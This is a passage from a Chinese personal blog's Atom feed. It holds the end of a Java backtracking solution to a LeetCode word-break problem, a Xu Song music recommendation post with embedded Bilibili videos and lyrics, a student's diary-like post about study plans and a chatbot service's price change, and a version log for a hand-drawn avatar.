&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dfs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 回溯&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E7%AE%97%E6%B3%95/" term="算法" label="算法" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E7%AE%97%E6%B3%95/" term="算法" label="算法" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/leetcode/" term="leetcode" label="leetcode" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">falconeの音乐时光——许嵩篇</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/8/" />
            <id>https://xuoneyuan.github.io/posts/8/</id>
            <updated>2023-12-02T23:26:49&#43;08:00</updated>
            <published>2023-11-29T17:12:10&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">今天推荐一位大家耳熟能详的歌手，许嵩 非主流年代的音乐三巨头之一，也是我认为三人中最有……</summary>
            
                <content type="html">&lt;p&gt;今天推荐一位大家耳熟能详的歌手，许嵩&lt;/p&gt;
&lt;p&gt;非主流年代的音乐三巨头之一，也是我认为三人中最有才气的一位&lt;/p&gt;
&lt;p&gt;视频来自于B站宝藏up主——音乐收藏馆和JLRS-LeoFM&lt;/p&gt;
&lt;h3 id=&#34;许嵩&#34;&gt;许嵩&lt;/h3&gt;
&lt;h4 id=&#34;庐州月&#34;&gt;《庐州月》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1Ys4y197BP&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    


&lt;blockquote class=&#34;quote&#34;&gt;&lt;p&gt;月也摇晃 人也彷徨 乌篷里传来了一曲离殇&lt;/p&gt;
&lt;p&gt;家乡月光 深深烙在我心上 却流不出当年泪光&lt;/p&gt;
&lt;p&gt;太多的伤 难诉衷肠 叹一句当时只道是寻常&lt;/p&gt;
&lt;/blockquote&gt; 

&lt;h4 id=&#34;清明雨上&#34;&gt;《清明雨上》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1jV4y1D7yt&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    


&lt;blockquote class=&#34;quote-center&#34;&gt;&lt;p&gt;木雕流金 岁月涟漪 七年前封笔 因为我今生挥毫只为你&lt;/p&gt;
&lt;p&gt;雨打湿了眼眶 年年倚井盼归堂 最怕不觉泪已拆两行&lt;/p&gt;
&lt;p&gt;我在人间彷徨 寻不到你的天堂 东瓶西镜放 恨不能遗忘&lt;/p&gt;
&lt;/blockquote&gt; 



&lt;blockquote class=&#34;quote-center&#34;&gt;&lt;p&gt;远方有琴 愀然空灵 声声催天雨 涓涓心事说给自己听&lt;/p&gt;
&lt;p&gt;月影憧憧 烟火几重 烛花红 红尘旧梦 梦断都成空&lt;/p&gt;
&lt;/blockquote&gt; 

&lt;h4 id=&#34;如果当时&#34;&gt;《如果当时》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1RN4y1N7HS&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    


&lt;blockquote class=&#34;quote-center&#34;&gt;&lt;p&gt;天灰了 雨坠了&lt;/p&gt;
&lt;p&gt;视线要模糊了&lt;/p&gt;
&lt;p&gt;此时感觉到你的重要&lt;/p&gt;
&lt;p&gt;爱走了 心走了&lt;/p&gt;
&lt;p&gt;你说你要走了&lt;/p&gt;
&lt;p&gt;我为你唱最后的古谣&lt;/p&gt;
&lt;/blockquote&gt; 



&lt;blockquote class=&#34;quote-center&#34;&gt;&lt;p&gt;红雨瓢泼泛起了回忆怎么潜 你美目如当年 流转我心间&lt;/p&gt;
&lt;p&gt;渡口边最后一面洒下了句点 与你若只如初见 何须感伤离别&lt;/p&gt;
&lt;/blockquote&gt; 

&lt;h4 id=&#34;多余的解释&#34;&gt;《多余的解释》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1wN411n7Jv&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    


&lt;blockquote class=&#34;quote&#34;&gt;
        &lt;p&gt;她只是我的妹妹 妹妹说紫色很有韵味&lt;/p&gt;&lt;/blockquote&gt; 

&lt;h4 id=&#34;有何不可&#34;&gt;《有何不可》&lt;/h4&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1WF411o7i9&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    


&lt;blockquote class=&#34;quote&#34;&gt;
        &lt;p&gt;大家好 我是VAE 这是我即将发表的首张独创专辑《自定义》里面的一首 推~ 荐曲目 词曲编曲都是我自己 希望这首歌曲 能在这个寒冷的冬天 带给大家一种 温暖的感 觉~&lt;/p&gt;&lt;/blockquote&gt; 

</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E9%9F%B3%E4%B9%90/" term="音乐" label="音乐" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E9%9F%B3%E4%B9%90/" term="音乐" label="音乐" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/bilibili/" term="bilibili" label="bilibili" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">我不知道还能说什么了</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/7/" />
            <id>https://xuoneyuan.github.io/posts/7/</id>
            <updated>2023-12-07T22:51:24&#43;08:00</updated>
            <published>2023-11-29T14:46:32&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">很遗憾，这篇文章不是技术类的，时隔十多天，再次发博客，没想到竟然还是抱怨生活的。哈哈……</summary>
            
                <content type="html">&lt;p&gt;很遗憾，这篇文章不是技术类的，时隔十多天，再次发博客，没想到竟然还是抱怨生活的。哈哈。&lt;/p&gt;
&lt;p&gt;当然这不代表我陷入了停滞期，相反，就在几天前，我跑到操场上一边吹着冷风，一边思考着到底应该发些什么。我想过写go的通道，Java里关于Spring bean的生命周期，写redis和MySQL数据一致性的问题，或者分布式锁，分布式ID的生成方案，好像死锁也可以，噢，我还可以写ACID，写nginx，写netty，写RPC框架，写kubernetes。可是最后，我什么也没有写出来。我只是觉得，我还没有对这个东西形成一个完整的认识，没有深刻的理解，我所写的一切，都是停留在最表面的层面，都只能借鉴别人现成的写好的东西，我有什么高论？我有什么看法？没有！我只不过是站在巨人的肩膀上看问题罢了，我不想装作这一切功劳都是我获得的一样，还没等别人看不下去，我自己就先吐了。&lt;/p&gt;
&lt;p&gt;于是我什么也没写。于是在这个下午我不知道我要干什么。于是我在床上躺到两点多。&lt;/p&gt;
&lt;p&gt;学会前端？后端？深度学习？拜托，你连anaconda都还没安装呢！回归网络安全？看会渗透？或者密码学？come on,我才不想学该死的cryptography！说实话，我对这玩意一点兴趣都没有。但是偏偏，你电又特别擅长这个。算了，干脆去图书馆吧。WTF,耳机又没带，小事，什么，充电宝也没电了！好，这么玩是吧。Calm down,比起这些，前面的一对情侣秀恩爱更让我无语。那行吧，到了点我自己走可以吧。&lt;/p&gt;
&lt;p&gt;一切愤怒的导火索还要追寻到今天上午，我本来高高兴兴打开我的GPT3.8，这是我在网上找到一个国人团队制作的好用的大模型。他不如openAI官网的GPT4，但他比GPT3.5还是强多了。就在今天，他告诉我，由于部分薅羊毛用户的存在，本站的收费方式由包月制改成按照token收费。&lt;/p&gt;
&lt;p&gt;我的脑子嗡一下麻了。仔细想想，他说的那个重度使用的人好像就是我。毕竟按他的计费方式，换算下来我一天最少能用30块钱，但是实际上我一天只花了一块多不到两块钱。这种感觉，就像之前一直利用的漏洞突然被修复一样，这个少数人才知道的后门被彻彻底底的堵死了，虽然我肯定没亏，但是接下来我又该怎么办呢？&lt;/p&gt;
&lt;p&gt;听会儿G.E.M.的歌吧，下一首是霉霉的，嗯，感觉心情又好了一点。&lt;/p&gt;
&lt;p&gt;说回学校，今天又在催填写去向的收集表了。F**K，真是哪壶不开提哪壶，屋漏偏逢连夜雨啊。你是故意找茬是不是？开玩笑的。但是，对于未来，我却出现了一丝犹豫，我对之前坚定的就业打算做了动摇。我突然觉得，学校也挺好的，起码跟社会比起来，他要单纯多了，简单多了。当然我也知道我是不可能一辈子都呆在学校的，但是多待个两三年好像也不错，我还有很多想法，很多打算，如果我去打工了，这些恐怕都要变成泡影了。我害怕我进入社会之后我就再也没有时间也没有精力去做这些事了。Wait，前面的情侣怎么走了？我都还没走呢！不考研了？不要你们的大好未来了？给我回来！&lt;/p&gt;
&lt;p&gt;估计是我打字的声音太响了他们俩才走的吧。话说坐在我斜对面的哥们放本书在桌子上怎么现在都还没回来。看看时间，三点半了，去饮茶了？噢我忘了，可能他们两个人有课，啊，なるほど！天天考研考研的，这里是B区，考研在A区，果然魔怔的人是我啊。说回考研，考去哪里？反正不是本校。回家去？可以！我想想，武大中大厦大，这都是家门口的好大学啊。其实当年我的分数是超了中大数学系最少5分的，如果我敢报，或许我现在就在广州了吧。还有高中同学建议考虑考虑中科大软院，浙大软院的，说实话现在我的做题水平是真不行了，不是做题家了，400多分太特么难了！知难而退不丢人，光说不做是懦夫。&lt;/p&gt;
&lt;p&gt;重申一次，我下午的效率非常非常低！这种状态真的什么都不想学。这可能跟我没有睡午觉的习惯有关。现在，我还是不知道我应该干什么，你让我学会课内的东西吧，真没动力了，又保不了研，这些东西一时间又用不上。学会数学，英语？我已经离开高中两年多了！无论是兴趣还是方法还是知识储备都是无限趋近于0，全部都忘光了，还给老师了。&lt;/p&gt;
&lt;p&gt;还有一件让人心烦的事，就是我的两颗门牙往外凸越来越明显了，最近说话总觉得有些大舌头，跟女生说话都说不清了，最明显的例子就是，食堂阿姨竟然把我最常点的饭的名字都听错了！&lt;/p&gt;
&lt;p&gt;呃呃呃呃呃，下一次更新什么，下一次什么时候更新？我不知道。人类什么时候灭亡？宇宙什么时候爆炸？我们来自哪里？我们最后又将去往何方。。。&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%84%9F%E6%83%B3/" term="感想" label="感想" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E5%AD%A6%E4%B9%A0/" term="学习" label="学习" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E7%94%9F%E6%B4%BB/" term="生活" label="生活" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">关于个人头像版本更新的公告</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/6/" />
            <id>https://xuoneyuan.github.io/posts/6/</id>
            <updated>2023-11-19T15:22:19&#43;08:00</updated>
            <published>2023-11-16T13:52:03&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">在开始前我忍不住想吐槽一下网易云，现在的网易云中文歌少就算了，vip歌曲越来越多我也……</summary>
            
                <content type="html">&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=330 height=86 src=&#34;https://xuoneyuan.github.io//music.163.com/outchain/player?type=2&amp;id=433107530&amp;auto=0&amp;height=66&#34;&gt;&lt;/iframe&gt;
&lt;p&gt;在开始前我忍不住想吐槽一下网易云，现在的网易云中文歌少就算了，vip歌曲越来越多我也忍了，可是我即便是开了黑胶，依然解决不了外部引用的问题。下载一首vip歌曲，只能在网易云上听，想要在博客引用一首歌，它检测到vip曲库就会禁止播放。实在没办法啊，原本我想用spotify来替代网易云，奈何我低估了国外的资本家赚钱的能力，倒腾了半天又折回网易云来了。&lt;/p&gt;
&lt;h4 id=&#34;background&#34;&gt;Background&lt;/h4&gt;
&lt;p&gt;让我们把时间线拨回到2023年9月28日，星期四，国庆放假前一天。很不幸，本人在这天的课有足足两节之多。为了打发时间，无聊的我决定打开三星画板开始画画&lt;/p&gt;
&lt;h4 id=&#34;version&#34;&gt;Version&lt;/h4&gt;
&lt;h5 id=&#34;ver-10&#34;&gt;ver 1.0&lt;/h5&gt;
&lt;p&gt;基本上确定了大致框架，放远了看大致像个人&lt;/p&gt;
&lt;h5 id=&#34;ver-11&#34;&gt;ver 1.1&lt;/h5&gt;
&lt;p&gt;填充了色彩；增添了人物衣袖和领结细节；更新了署名字体&lt;/p&gt;
&lt;h5 id=&#34;ver-12&#34;&gt;ver 1.2&lt;/h5&gt;
&lt;p&gt;增设了背景结构，添加了叹气符号；丰富了人物头发细节；使人物头发上的爱心发夹更加清晰&lt;/p&gt;
&lt;h5 id=&#34;ver-13&#34;&gt;ver 1.3&lt;/h5&gt;
&lt;p&gt;重新画了眼镜、手、领结；增加了蓝色外套和白色衬衫细节；增加了麻花辫细节&lt;/p&gt;
&lt;h5 id=&#34;ver-14&#34;&gt;ver 1.4&lt;/h5&gt;
&lt;p&gt;填充色彩；修改了眼睛的部分细节，使眼睛看上去更加真实&lt;/p&gt;
&lt;h5 id=&#34;ver-20&#34;&gt;ver 2.0&lt;/h5&gt;
&lt;p&gt;采用更细的画笔重新构建了人物大部分细节；增大了腮红面积；增设了外套和衬衫的边界；增加了眼镜细节；对眼睛进行了较大幅度修改&lt;/p&gt;
&lt;h5 id=&#34;ver-21&#34;&gt;ver 2.1&lt;/h5&gt;
&lt;p&gt;改变了署名字体&lt;/p&gt;
&lt;h5 id=&#34;ver-22&#34;&gt;ver 2.2&lt;/h5&gt;
&lt;p&gt;对麻花辫进行了修改；改变了嘴巴的画法&lt;/p&gt;
&lt;h5 id=&#34;ver-23&#34;&gt;ver 2.3&lt;/h5&gt;
&lt;p&gt;将署名改成 BY: XX格式；填充色彩&lt;/p&gt;
&lt;h5 id=&#34;ver-24&#34;&gt;ver 2.4&lt;/h5&gt;
&lt;p&gt;修改背景细节&lt;/p&gt;
&lt;h5 id=&#34;ver-25&#34;&gt;ver 2.5&lt;/h5&gt;
&lt;p&gt;修改了眼镜和眼睛的细节，使镜框变得不封闭；对头发进行了部分修改，修改了衣服细节&lt;/p&gt;
&lt;h5 id=&#34;ver-26&#34;&gt;ver 2.6&lt;/h5&gt;
&lt;p&gt;修改了衬衫和领结的细节；修改了背景细节&lt;/p&gt;
&lt;h5 id=&#34;ver-27&#34;&gt;ver 2.7&lt;/h5&gt;
&lt;p&gt;修改了手的细节；修改了眼睛的细节，使眼睛让上去更加有神；修改了头发的细节；修改了领结细节，使领结变得更加对称&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%9D%82%E6%96%87/" term="杂文" label="杂文" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E6%9D%BF%E7%BB%98/" term="板绘" label="板绘" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E7%BD%91%E6%98%93%E4%BA%91/" term="网易云" label="网易云" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
